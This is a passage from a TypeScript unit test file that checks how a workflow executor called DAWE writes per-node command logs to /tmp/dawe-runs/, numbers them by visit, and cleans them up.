      const logPath = executor.writeFilePointerLog(instanceId, 'run_tests', 2, 'npm test', result);
      expect(logPath).not.toBeNull();

      const content = readFileSync(logPath!, 'utf-8');
      expect(content).toContain('=== DAWE System Action Log ===');
      expect(content).toContain(`Instance: ${instanceId}`);
      expect(content).toContain('Node: run_tests');
      expect(content).toContain('Visit: 2');
      expect(content).toContain('Command: npm test');
      expect(content).toContain('Exit Code: 1');
      expect(content).toContain('=== STDOUT ===');
      expect(content).toContain('test output line');
      expect(content).toContain('=== STDERR ===');
      expect(content).toContain('error output line');

      cleanFilePointerDir(instanceId);
    });

    it('file pointer path returned correctly from writeFilePointerLog', () => {
      const instanceId = 'test-instance-fp3';
      cleanFilePointerDir(instanceId);

      const result = {
        exit_code: 0,
        stdout: '',
        stderr: '',
        duration_ms: 50,
        timed_out: false,
        command_executed: 'echo test',
      };

      const logPath = executor.writeFilePointerLog(instanceId, 'build', 1, 'echo test', result);
      expect(logPath).toContain('/tmp/dawe-runs/');
      expect(logPath).toContain(instanceId);
      expect(logPath).toContain('build');
      expect(logPath).toContain('-1.log');

      cleanFilePointerDir(instanceId);
    });

    it('/tmp/dawe-runs/ directory created if missing', () => {
      const instanceId = 'test-instance-fp4';
      // Remove the dir if it exists (may have leftover files)
      cleanFilePointerDir(instanceId);

      const result = {
        exit_code: 0,
        stdout: 'output',
        stderr: '',
        duration_ms: 10,
        timed_out: false,
        command_executed: 'echo',
      };

      const logPath = executor.writeFilePointerLog(instanceId, 'node1', 1, 'echo', result);
      expect(logPath).not.toBeNull();
      expect(existsSync(FILE_POINTER_DIR)).toBe(true);

      cleanFilePointerDir(instanceId);
    });

    it('multiple executions of same node create visit-numbered logs', () => {
      const instanceId = 'test-instance-fp5';
      cleanFilePointerDir(instanceId);

      const result = {
        exit_code: 0,
        stdout: '',
        stderr: '',
        duration_ms: 10,
        timed_out: false,
        command_executed: 'echo',
      };

      const log1 = executor.writeFilePointerLog(instanceId, 'run_tests', 1, 'echo', result);
      const log2 = executor.writeFilePointerLog(instanceId, 'run_tests', 2, 'echo', result);
      const log3 = executor.writeFilePointerLog(instanceId, 'run_tests', 3, 'echo', result);

      expect(log1).toContain('-1.log');
      expect(log2).toContain('-2.log');
      expect(log3).toContain('-3.log');
      expect(existsSync(log1!)).toBe(true);
      expect(existsSync(log2!)).toBe(true);
      expect(existsSync(log3!)).toBe(true);

      cleanFilePointerDir(instanceId);
    });

    it('cleanupFilePointerLogs removes all instance files', () => {
      const instanceId = 'test-instance-fp6';
      cleanFilePointerDir(instanceId);

      const result = {
        exit_code: 0,
        stdout: '',
        stderr: '',
        duration_ms: 10,
        timed_out: false,
        command_executed: 'echo',
      };

      executor.writeFilePointerLog(instanceId, 'node1', 1, 'echo', result);
      executor.writeFilePointerLog(instanceId, 'node2', 1, 'echo', result);
      executor.writeFilePointerLog(instanceId, 'node1', 2, 'echo', result);

      const cleaned = executor.cleanupFilePointerLogs(instanceId);
      expect(cleaned).toBe(3);

      // Verify files are gone
      if (existsSync(FILE_POINTER_DIR)) {
        const remaining = readdirSync(FILE_POINTER_DIR).filter((f: string) => f.startsWith(`${instanceId}-`));
        expect(remaining.length).toBe(0);
      }
    });

    it('cleanupFilePointerLogs returns 0 when no files exist', () => {
      const cleaned = executor.cleanupFilePointerLogs('nonexistent-instance-id');
      expect(cleaned).toBeGreaterThanOrEqual(0);
    });
  });

  // close outer describe
});
